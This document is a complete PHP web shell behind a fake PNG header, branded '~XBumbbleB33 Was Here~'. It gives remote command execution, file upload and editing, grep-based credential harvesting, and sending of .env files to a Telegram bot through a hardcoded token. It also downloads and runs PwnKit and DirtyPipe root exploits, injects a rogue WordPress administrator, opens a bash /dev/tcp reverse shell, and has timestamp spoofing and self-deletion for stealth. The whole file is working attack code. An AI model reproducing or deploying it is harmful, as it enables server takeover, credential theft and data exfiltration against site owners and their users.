�PNG

<?php
/**
 * ~XBumbbleB33 Was Here~ - CYBER-OSC V2.8
 * "The Ultimate Weapon for the Ultimate Ops"
 */

// --- CONFIGURATION (Bot for Shell Access & Alerts) ---
$telegram_bot_token = "8655979350:AAH42-qN8ftfiWqUbyTnIybRUczLWC8zZcY"; 
$telegram_chat_id = "8235457641";     
$password = "@XBumbbleB33"; 

// --- SESSION & AUTH ---
session_start();
if (isset($_POST['pass'])) {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
    $full_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if ($_POST['pass'] == $password) {
        $_SESSION['d1337_auth'] = true;
        _notif("✅ [LOGIN SUCCESS] ~XBumbbleB33~\n🌐 IP: " . $_SERVER['SERVER_ADDR'] . "\n📂 URL: " . $full_url . "\n🖥️ OS: " . php_uname() . "\n👤 USER: " . get_current_user());
    } else {
        _notif("❌ [LOGIN FAILED] ~XBumbbleB33~\n🌐 IP: " . $_SERVER['REMOTE_ADDR'] . "\n📂 URL: " . $full_url);
    }
}

if (!isset($_SESSION['d1337_auth'])) {
    die('<!DOCTYPE html><html><head><title>~XBumbbleB33 Was Here~</title><style>body{background:#000;color:#fcee0a;text-align:center;padding-top:100px;font-family:Courier;}input{background:#000;border:1px solid #fcee0a;color:#fcee0a;outline:none;text-align:center;box-shadow:0 0 10px #fcee0a;}</style></head><body><h1 style="text-shadow:0 0 20px #fcee0a;">~XBumbbleB33 Was Here~</h1><form method="POST"><input type="password" name="pass" autofocus></form></body></html>');
}

// --- CORE SETTINGS ---
error_reporting(0); ini_set('display_errors', 0); ini_set('max_execution_time', 0); set_time_limit(0); @ignore_user_abort(true);

// --- NAVIGATION & DIR ---
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = str_replace('\\', '/', realpath($current_dir));
if (!is_dir($current_dir)) { $current_dir = str_replace('\\', '/', getcwd()); }
chdir($current_dir);

$output = ''; 
$mode = isset($_GET['mode']) ? $_GET['mode'] : 'file_manager';

// --- HELPER FUNCTIONS ---
function _cmd($cmd) {
    if(function_exists('shell_exec')) return shell_exec($cmd.' 2>&1');
    if(function_exists('system')) { ob_start(); system($cmd.' 2>&1'); return ob_get_clean(); }
    if(function_exists('passthru')) { ob_start(); passthru($cmd.' 2>&1'); return ob_get_clean(); }
    if(function_exists('exec')) { exec($cmd.' 2>&1', $out); return implode("\n", $out); }
    return "DISABLED";
}

function _notif($msg) {
    global $telegram_bot_token, $telegram_chat_id;
    if(!$telegram_bot_token || $telegram_bot_token == "YOUR_BOT_TOKEN_HERE") return;
    $url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
    $data = json_encode(['chat_id' => $telegram_chat_id, 'text' => $msg]);
    $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_exec($ch); curl_close($ch);
}

function nBqq6($path) {
    if (!file_exists($path)) return "--";
    $perms = fileperms($path);
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

// ALERT ON FIRST LOAD REMOVED - NOW HANDLED BY UPLOADER RESULT BOT

// --- ACTION HANDLERS ---
if (isset($_POST['harvest_loot'])) {
    $keys = ['DB_PASSWORD', 'AWS_SECRET', 'SENDGRID', 'STRIPE', 'MAIL_PASSWORD', 'APP_KEY', 'JWT_SECRET', 'DB_PASS', 'PASSWD'];
    $self = basename($_SERVER['SCRIPT_FILENAME']); $output .= "--- 💰 HARVESTING CREDENTIALS --- \n";
    foreach($keys as $k) {
        $res = _cmd("grep -ri \"$k\" . --exclude=\"$self\" --exclude-dir={.git,node_modules,vendor} -n -i 2>/dev/null | head -n 15");
        if($res) $output .= "\n[MATCH: $k]:\n$res\n";
    }
}

if (isset($_POST['harvest_env_tg'])) {
    $output .= "--- 🚀 AUTO-HARVESTING ENV TO TELEGRAM --- \n";
    $target_dir = "/home/" . get_current_user();
    $files = _cmd("find $target_dir -maxdepth 5 -name '.env' 2>/dev/null");
    $file_list = explode("\n", trim($files));
    $count = 0;
    foreach($file_list as $f) {
        $f = trim($f); if(empty($f) || !is_readable($f)) continue;
        $content = @file_get_contents($f);
        if($content) {
            $msg = "💰 [ENV FOUND] 💰\n📂 PATH: $f\n🌐 HOST: " . $_SERVER['HTTP_HOST'] . "\n\n" . substr($content, 0, 3500);
            _notif($msg); $count++; $output .= "[+] Sent to TG: $f\n";
        }
    }
    $output .= "\n[DONE] Total $count ENV files sent to Telegram!";
}

if (isset($_POST['run_mass_scan'])) {
    $paths = ['/home/'.get_current_user(), '/var/www', '/etc/apache2'];
    foreach($paths as $p) {
        $find = _cmd("find $p -maxdepth 3 -name 'wp-config.php' -o -name '.env' -o -name 'env.php' 2>/dev/null");
        if($find) $output .= "[FOUND IN $p]:\n$find\n";
    }
}

if (isset($_POST['run_root_exploit'])) {
    $exploit = $_POST['exploit_choice'];
    $urls = ['PwnKit'=>'https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit', 'DirtyPipe'=>'https://raw.githubusercontent.com/Ph4nt0m-S/DirtyPipe-Exploit/main/dirtypipe'];
    $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $urls[$exploit]); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); $bin = curl_exec($ch); curl_close($ch);
    if($bin) {
        $save = $current_dir . "/.d1337_x"; file_put_contents($save, $bin); chmod($save, 0755); $res = _cmd("$save id");
        $output = "[+] Exploit Result:\n$res"; if(strpos($res, 'uid=0') !== false) _notif("👑 ROOT Success on " . $_SERVER['HTTP_HOST']);
        @unlink($save);
    } else { $output = "[-] Gagal download exploit via cURL."; }
}

if (isset($_POST['inject_wp'])) {
    $conn = @new mysqli($_POST['wp_host'], $_POST['wp_user'], $_POST['wp_pass'], $_POST['wp_db']);
    if ($conn->connect_error) { $output = "[-] DB Fail: " . $conn->connect_error; }
    else {
        $user = "b33_admin"; $pass = md5("pwned_by_b33"); $pref = $_POST['wp_prefix'];
        $conn->query("INSERT INTO {$pref}users (user_login, user_pass, user_nicename, user_email, user_registered, display_name) VALUES ('$user', '$pass', '$user', 'admin@b33.ai', NOW(), '$user')");
        $id = $conn->insert_id;
        $conn->query("INSERT INTO {$pref}usermeta (user_id, meta_key, meta_value) VALUES ($id, '{$pref}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
        $conn->query("INSERT INTO {$pref}usermeta (user_id, meta_key, meta_value) VALUES ($id, '{$pref}user_level', '10')");
        $output = "[+] WP Admin Injected! User: $user | Pass: pwned_by_b33";
        _notif("💉 [WP INJECTED] Admin added on " . $_SERVER['HTTP_HOST']);
        $conn->close();
    }
}

if (isset($_POST['gen_adminer'])) {
    $adminer_url = "https://www.adminer.org/static/download/4.8.1/adminer-4.8.1.php";
    $adminer_file = $current_dir . "/b33_db.php";
    $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $adminer_url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); $content = curl_exec($ch); curl_close($ch);
    if($content) { file_put_contents($adminer_file, $content); $output = "[+] ADMINER CREATED: b33_db.php"; }
    else { $output = "[-] Fail download adminer."; }
}

if (isset($_POST['run_revshell'])) {
    $ip = $_POST['ip']; $port = $_POST['port']; $payload = "bash -i >& /dev/tcp/$ip/$port 0>&1";
    _cmd($payload); $output = "[+] Reverse Shell SENT to $ip:$port";
}

if (isset($_GET['proxy_url'])) {
    $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET['proxy_url']); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); $res = curl_exec($ch); curl_close($ch); die($res);
}

if (isset($_POST['spoof_time'])) { $target = $current_dir."/index.php"; if(file_exists($target)) { touch(__FILE__, filemtime($target)); $output = "[+] Time Spoofed to match index.php"; } else { touch(__FILE__); $output = "[+] index.php not found. Time set to NOW."; } }
if (isset($_POST['suicide_btn'])) { _notif("⚠️ [~XBumbbleB33~] SELF-DELETE on " . $_SERVER['HTTP_HOST']); @unlink(__FILE__); die("SHELL DELETED."); }
if (isset($_GET['check_live'])) die("B33_LIVE_SIGNAL");
if (isset($_POST['execute_cmd'])) $output = _cmd($_POST['cmd']);
if (isset($_POST['upload_btn'])) { move_uploaded_file($_FILES['file']['tmp_name'], $current_dir.'/'.$_FILES['file']['name']); header("Location: ?dir=".urlencode($current_dir)."&mode=file_manager"); exit; }
if (isset($_POST['save_file'])) { file_put_contents($current_dir.'/'.$_POST['filename'], $_POST['content']); header("Location: ?dir=".urlencode($current_dir)."&mode=file_manager"); exit; }
if (isset($_GET['delete'])) { $f = $_GET['delete']; if($f != "." && $f != "..") { @unlink($current_dir.'/'.$f); header("Location: ?dir=".urlencode($current_dir)."&mode=file_manager"); exit; } }

?>
<!DOCTYPE html>
<html>
<head>
<title>~XBumbbleB33 Was Here~</title>
<style>
    body { background: #050505; color: #fcee0a; font-family: 'Courier New'; font-size: 11px; padding: 5px; }
    a { color: #fcee0a; text-decoration: none; } a:hover { color: #fff; background: #900; box-shadow: 0 0 10px #f00; }
    .header { border-bottom: 2px solid #fcee0a; padding: 10px; text-align: center; background: #000; box-shadow: 0 0 20px rgba(252,238,10,0.2); }
    .nav { background: #0a0a0a; padding: 5px; display: flex; flex-wrap: wrap; gap: 3px; justify-content: center; border: 1px solid #222; margin: 5px 0; }
    .nav a { background: #111; padding: 5px 12px; border: 1px solid #333; border-radius: 2px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
    .nav a:hover { border-color: #fcee0a; color: #fff; }
    .main { border: 1px solid #222; padding: 15px; background: #000; min-height: 480px; box-shadow: inset 0 0 50px rgba(0,0,0,1); }
    input, textarea, select { background: #000; color: #fcee0a; border: 1px solid #333; padding: 10px; width: 100%; box-sizing: border-box; outline: none; font-family: 'Courier New'; }
    input:focus, textarea:focus { border-color: #fcee0a; box-shadow: 0 0 10px rgba(252,238,10,0.3); }
    input[type=submit] { background: #fcee0a; color: #000; cursor: pointer; width: auto; font-weight: 900; margin-top: 5px; padding: 10px 30px; text-transform: uppercase; border: none; }
    input[type=submit]:hover { background: #fff; box-shadow: 0 0 20px #fff; }
    table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #050505; }
    td, th { border: 1px solid #111; padding: 8px; text-align: left; }
    th { background: #111; color: #fcee0a; text-transform: uppercase; font-size: 10px; letter-spacing: 2px; }
    pre { border: 1px solid #fcee0a; padding: 15px; overflow: auto; background: #000; max-height: 500px; color: #00ff41; position: relative; }
    pre::before { content: "TERMINAL_OUTPUT"; position: absolute; top: 0; right: 10px; font-size: 8px; color: #333; }
</style>
</head>
<body>
<div class="header">
    <h1 style="text-shadow: 0 0 15px #fcee0a; letter-spacing: 10px;">~XBumbbleB33 WAS HERE~</h1>
    <div style="color: #00f0ff; letter-spacing: 3px; font-size: 10px;">OS: <?php echo php_uname(); ?> | USER: <?php echo get_current_user(); ?></div>
</div>
<div class="nav">
    <a href="?dir=<?php echo urlencode($current_dir); ?>&mode=file_manager">📂 FILES</a> 
    <a href="?dir=<?php echo urlencode($current_dir); ?>&mode=terminal">🖥️ TERMINAL</a> 
    <a href="?dir=<?php echo urlencode($current_dir); ?>&mode=loot">💰 PANEN LOOT</a> 
    <a href="?dir=<?php echo urlencode($current_dir); ?>&mode=database">💉 DATABASE/WP</a> 
    <a href="?dir=<?php echo urlencode($current_dir); ?>&mode=root_hammer">🔨 ROOT HAMMER</a>
    <a href="?dir=<?php echo urlencode($current_dir); ?>&mode=network">🐚 REVSHELL</a>
    <a href="?dir=<?php echo urlencode($current_dir); ?>&mode=tunnel">🌐 TUNNELING</a> 
    <a href="?dir=<?php echo urlencode($current_dir); ?>&mode=stealth">🕵️ STEALTH</a>
</div>
<div class="main">
    <?php if($output): ?><pre><?php echo htmlspecialchars($output); ?></pre><?php endif; ?>

    <?php if($mode == 'file_manager'): ?>
        <h3 style="color:#00f0ff;">📂 Dir: <?php echo $current_dir; ?></h3>
        <table>
            <tr><th>Name</th><th>Size</th><th>Perms</th><th>Action</th></tr>
            <tr><td><a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>&mode=file_manager">..</a></td><td>DIR</td><td>-</td><td>-</td></tr>
            <?php foreach(scandir($current_dir) as $f) {
                if($f == "." || $f == "..") continue;
                $p = $current_dir.'/'.$f; $is_dir = is_dir($p);
                echo "<tr><td><a href='?dir=".urlencode($is_dir?$p:$current_dir)."&mode=".($is_dir?'file_manager':'edit')."&file=$f'>".($is_dir?"[ $f ]":$f)."</a></td><td>".($is_dir?'DIR':filesize($p))."</td><td>".nBqq6($p)."</td><td><a href='?dir=".urlencode($current_dir)."&delete=$f' onclick=\"return confirm('Hapus $f?')\">[DEL]</a></td></tr>";
            } ?>
        </table>
        <form method="POST" enctype="multipart/form-data" style="margin-top:20px; border-top:1px solid #222; padding-top:10px;">
            <span style="color:#00f0ff;">UPLOAD_PAYLOAD:</span> <input type="file" name="file" style="width:auto; border:none;"> 
            <input type="submit" name="upload_btn" value="EXECUTE_UPLOAD">
        </form>
    <?php endif; ?>

    <?php if($mode == 'terminal'): ?>
        <h3>🖥️ NEURAL_TERMINAL</h3>
        <form method="POST">
            <input type="text" name="cmd" placeholder="b33@phantom:~$ Enter command..." autofocus>
            <input type="submit" name="execute_cmd" value="RUN_COMMAND">
        </form>
    <?php endif; ?>

    <?php if($mode == 'loot'): ?>
        <h3>💰 CREDENTIAL HARVESTER</h3>
        <p style="color:#666;">Scraping target environment for AWS, Stripe, and Database secrets...</p>
        <form method="POST"><input type="submit" name="harvest_loot" value="🔥 INITIATE HARVEST 🔥" style="background:#fcee0a; color:#000; width:100%; font-weight:bold;"></form>
        
        <h3 style="margin-top:40px; color:#fcee0a;">Mass .env Harvester (Telegram Mode) 🚀</h3>
        <p style="color:#666;">Exfiltrate all discovered .env files directly to your C2 Telegram Channel.</p>
        <form method="POST"><input type="submit" name="harvest_env_tg" value="🚀 EXFILTRATE TO TELEGRAM 🚀" style="background:#00f0ff; color:#000; width:100%; font-weight:bold;"></form>
    <?php endif; ?>

    <?php if($mode == 'database'): ?>
        <h3>💉 DATABASE & WORDPRESS HIJACK</h3>
        <form method="POST"><input type="submit" name="run_mass_scan" value="🔍 SCAN CONFIGS" style="background:#111; border:1px solid #333; color:#fcee0a; width: 100%; font-weight:bold;"></form>
        <form method="POST" style="margin-top:10px;"><input type="submit" name="gen_adminer" value="💎 GENERATE ADMINER (b33_db.php)" style="background:#111; border:1px solid #333; color:#00f0ff; width: 100%;"></form>
        <h4 style="color:#fcee0a; margin-top:30px;">WP_ADMIN_INJECTION_PROTOCOL</h4>
        <form method="POST" style="background:#050505; padding:15px; border:1px solid #222;">
            <div style="display:grid; grid-template-cols: repeat(5, 1fr); gap:10px;">
                <div>Host: <input type="text" name="wp_host" value="localhost"></div>
                <div>User: <input type="text" name="wp_user"></div>
                <div>Pass: <input type="text" name="wp_pass"></div>
                <div>DB: <input type="text" name="wp_db"></div>
                <div>Prefix: <input type="text" name="wp_prefix" value="wp_"></div>
            </div>
            <input type="submit" name="inject_wp" value="EXECUTE_INJECTION" style="width: 100%; margin-top:15px;">
        </form>
    <?php endif; ?>

    <?php if($mode == 'root_hammer'): ?>
        <h3>👑 ROOT_HAMMER_EXPLOIT</h3>
        <div style="background:#050505; padding:20px; border:1px solid #fcee0a; box-shadow: 0 0 20px rgba(252,238,10,0.1);">
            <p style="color:#fff;">WARNING: Escalating privileges may trigger security alerts.</p>
            <form method="POST" style="margin-top:15px;">
                <select name="exploit_choice" style="margin-bottom:10px;">
                    <option value="PwnKit">PwnKit (CVE-2021-4034)</option>
                    <option value="DirtyPipe">DirtyPipe (CVE-2022-0847)</option>
                </select>
                <input type="submit" name="run_root_exploit" value="🔨 START_HAMMERING" style="background:#ff003c; color:#fff; width:100%;">
            </form>
        </div>
    <?php endif; ?>

    <?php if($mode == 'network'): ?>
        <h3>🐚 REVERSE_SHELL_PAYLOAD</h3>
        <form method="POST" style="background:#050505; padding:20px; border:1px solid #222;">
            LHOST: <input type="text" name="ip" placeholder="0.0.0.0" style="width:150px;"> 
            LPORT: <input type="text" name="port" placeholder="4444" style="width:80px;">
            <input type="submit" name="run_revshell" value="🐚 CONNECT_BACK" style="background:#ff003c; color:#fff;">
        </form>
    <?php endif; ?>

    <?php if($mode == 'tunnel'): ?>
        <h3>🌐 NEURAL_HTTP_PROXY</h3>
        <form method="GET"><input type="hidden" name="mode" value="tunnel"><input type="hidden" name="dir" value="<?php echo $current_dir; ?>">
            <input type="text" name="proxy_url" placeholder="https://api.ipify.org" style="width: 85%;">
            <input type="submit" value="FETCH" style="width: 13%;">
        </form>
    <?php endif; ?>

    <?php if($mode == 'stealth'): ?>
        <h3>🕵️ STEALTH_SURVEILLANCE_BYPASS</h3>
        <form method="POST"><input type="submit" name="spoof_time" value="🕵️ SPOOF_TIMESTAMP (Match index.php)"></form>
        <div style="margin-top:30px; border:1px solid #ff003c; padding:20px; background: rgba(255,0,60,0.05);">
            <p style="color:#ff003c; font-weight:bold;">SELF-DESTRUCT PROTOCOL</p>
            <form method="POST" onsubmit="return confirm('INITIATE WIPE?');">
                <input type="submit" name="suicide_btn" value="🧨 EMERGENCY_WIPE_TOTAL" style="background:#ff003c; color:#fff; width: 100%;">
            </form>
        </div>
    <?php endif; ?>

    <?php if($mode == 'edit' && isset($_GET['file'])): ?>
        <h3 style="color:#00f0ff;">Edit: <?php echo $_GET['file']; ?></h3>
        <form method="POST">
            <input type="hidden" name="filename" value="<?php echo $_GET['file']; ?>">
            <textarea name="content" style="height:450px; font-size:12px; border-color:#fcee0a;"><?php echo htmlspecialchars(file_get_contents($current_dir.'/'.$_GET['file'])); ?></textarea>
            <input type="submit" name="save_file" value="SAVE_CHANGES">
        </form>
    <?php endif; ?>
</div>
<p style="text-align:center; color:#222; font-size:9px; margin-top:20px; letter-spacing:5px;">[ PROTECTED BY ~XBUMBBLEB33~ ]</p>
</body>
</html>